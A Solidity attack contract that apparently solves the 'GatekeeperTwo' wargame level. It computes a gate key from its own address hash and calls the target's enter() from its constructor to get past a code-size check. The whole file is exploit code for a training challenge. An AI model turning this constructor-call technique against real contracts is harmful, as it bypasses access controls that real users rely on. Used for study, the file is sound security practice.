pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo public target;

    constructor(address _target) {
        target = IGatekeeperTwo(_target);
        // Calculate gateKey properly
        bytes32 hash = keccak256(abi.encodePacked(address(this)));
        bytes8 hashAsBytes8 = bytes8(hash);
        uint64 x = uint64(hashAsBytes8);
        bytes8 gateKey = bytes8(x ^ type(uint64).max);
        target.enter(gateKey);
    }

    // Fallback to let tx.origin be captured correctly
    fallback() external payable {}
}